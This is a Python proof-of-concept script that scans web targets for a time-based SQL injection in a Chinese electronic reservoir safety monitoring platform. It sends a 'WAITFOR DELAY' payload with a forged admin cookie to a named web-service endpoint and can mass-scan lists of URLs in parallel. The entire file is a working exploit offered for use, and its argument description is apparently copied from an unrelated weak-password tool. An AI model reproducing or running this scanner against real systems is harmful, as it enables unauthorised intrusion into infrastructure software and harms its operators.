# -*- coding: utf-8 -*-
import argparse
import base64
import re
import sys
from multiprocessing.dummy import Pool

import requests
import urllib3
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def banner():
    test = """
           8b        d8   88           88      a8P  88 888b      88   ,ad8888ba,   
            Y8,    ,8P  ,d88           88    ,88' ,d88 8888b     88  d8"'    `"8b  
             Y8,  ,8P 888888           88  ,88" 888888 88 `8b    88 d8'            
              "8aa8"      88           88,d88'      88 88  `8b   88 88             
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                88        88           88P   Y8b    88 88    `8b 88 Y8,        88  
                88        88           88     "88,  88 88     `888   `"Y88888P"   

                            888888888888 

                            tag: this is a  某电子水库安全监管平台sql注入漏洞 poc                                       
                                        @version: 1.0.3   @author: Y1_K1NG           
    """
    print(test)


def poc(target):
    if target[-1] == '/':
        target = target
    else:
        target = target + "/"
    url = target + 'WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId'


    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": "currentuser=username=admin; usercookiename=usernames=admin;",
        "Content-Length": "128"

    }
    data = '''loginIdentifer=123&simcardId=123';WAITFOR DELAY '0:0:3'--'''

    try:
        response = requests.post(url, headers=headers, verify=False, timeout=15, data=data)
        # print(response.request.body)
        # print(response.content)
        if response.status_code == 200 and response.elapsed.total_seconds() > 2:
            print(f"[+] {target} 存在 sql ")
        else:
            print(f"[-] {target} 未发现 sql")
    except Exception as e:
        print(f"[*] {target} error: {str(e)}")


def extract_host(url):
    """
    从 URL 中提取主机地址和端口号，返回 (host, port)
    """
    match = re.search(r"(http://|https://)?([\w\.]+):?(\d+)?", url)
    if match:
        prefix, host, port = match.groups()
        if not port:
            if prefix and "https" in prefix:
                port = "443"
            else:
                port = "80"
        return host, int(port)
    else:
        return None, None


def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()

    if args.url and not args.file:
        if "https://" in args.url or "http://" in args.url:
            url = args.url
        else:
            host, port = extract_host(args.url)
            url = f"http://{host}:{port}"
        poc(url)

    elif args.url is None and args.file is not None:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url = url.strip().replace("\n", "")
                if "https://" in url or "http://" in url:
                    url = url
                else:
                    host, port = extract_host(url)
                    url = f"http://{host}:{port}"
                url_list.append(url)

        pool = Pool(10)
        pool.map(poc, url_list)
        pool.close()
        pool.join()

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
